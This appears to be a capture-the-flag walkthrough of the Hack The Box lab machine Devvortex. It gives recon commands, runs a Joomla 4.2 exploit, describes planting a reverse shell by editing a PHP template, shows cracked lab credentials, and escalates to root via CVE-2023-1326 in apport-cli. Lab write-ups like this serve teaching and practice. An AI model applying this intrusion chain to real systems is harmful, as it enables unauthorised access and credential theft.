
![[devvortex logo.png]]


```
nmap -sVC 10.129.97.129
```
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When going on the web server we notice 

![Pasted image 20251007195407](Images/Pasted%20image%2020251007195407.png)so we add the domain to our /etc/hosts

```
echo '10.129.97.129 devvortex.htb'  >> /etc/hosts
```

![Pasted image 20251007195705](Images/Pasted%20image%2020251007195705.png)

We found nothing, so we look for subdomain

```
ffuf -c -w `fzf-wordlists` -u "http://devvortex.htb/FUZZ" -H "Host : FUZZ.devvortex.htb" -fw 4 -mc all
```

![Pasted image 20251007205220](Images/Pasted%20image%2020251007205220.png)

we add `dev.devvortex.htb` to our hosts file

![Pasted image 20251007211634](Images/Pasted%20image%2020251007211634.png)

Enumerating the subdomain with the command

```
ffuf -c -w `fzf-wordlists` -u "http://dev.devvortex.htb/FUZZ" -e .php,.txt  
```

we found /README.txt

![Pasted image 20251007212021](Images/Pasted%20image%2020251007212021.png)

We now know the website is running joomla 4.2

We look for exploit with searchsploit

```
searchsploit joomla 4.2
```

and we find an exploit !

![Pasted image 20251007212228](Images/Pasted%20image%2020251007212228.png)

we move it to our directory and we run it using 

```
ruby exploit.rb http://dev.devvortex.htb
```

![Pasted image 20251007212357](Images/Pasted%20image%2020251007212357.png)

We got an username & password combo. Plus we now the DB is mysql

```
lewis:P4ntherg0t1n5r3c0n##
```


After going to the URL

```
http://dev.devvortex.htb/administrator/
```

![Pasted image 20251007212524](Images/Pasted%20image%2020251007212524.png)

We enter our credentials and we succesfully logged in the admin panel

![Pasted image 20251007212613](Images/Pasted%20image%2020251007212613.png)

We now will be looking for an template to edit in order to get a reverse shell

After going to the cassipeia template, we edit one of the .php file to put our revshell

![Pasted image 20251007212852](Images/Pasted%20image%2020251007212852.png)


After saving and going to the url

```
http://dev.devvortex.htb/templates/cassiopeia/offline.php
```

We get our revershell on our netcat listener 

![Pasted image 20251007213022](Images/Pasted%20image%2020251007213022.png)

We stabilize our shell and we try to do lateral movement for the user logan (found in home directory)

Remember, the backend of the website is mysql, let's try to connect to it using the credentials we found earlier

![Pasted image 20251007213205](Images/Pasted%20image%2020251007213205.png)

It worked, we will now enumerate the DB

![Pasted image 20251007213357](Images/Pasted%20image%2020251007213357.png)

and we get the credential for user logan

![Pasted image 20251007213439](Images/Pasted%20image%2020251007213439.png)

We now need to write the hash to hashcat to decrypt it

![Pasted image 20251007213535](Images/Pasted%20image%2020251007213535.png)

And got another pair of credential

```
logan:tequieromucho
```

Let's connect to ssh with theses id

![Pasted image 20251007213636](Images/Pasted%20image%2020251007213636.png)
we get the user.txt flag in his directory and we run 

```
sudo -l 
```

and we see

```
User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

Using the command with the -v flag to see the version, we now it's vulenerable to CVE-2023-1326

I found this article that show a POC to exploit it
https://0xd1eg0.medium.com/cve-2023-1326-poc-c8f2a59d0e00

After doing it, we got root !

![Pasted image 20251007214006](Images/Pasted%20image%2020251007214006.png)

We grab the flag in /root/root.txt and this is were our walkthrough end.

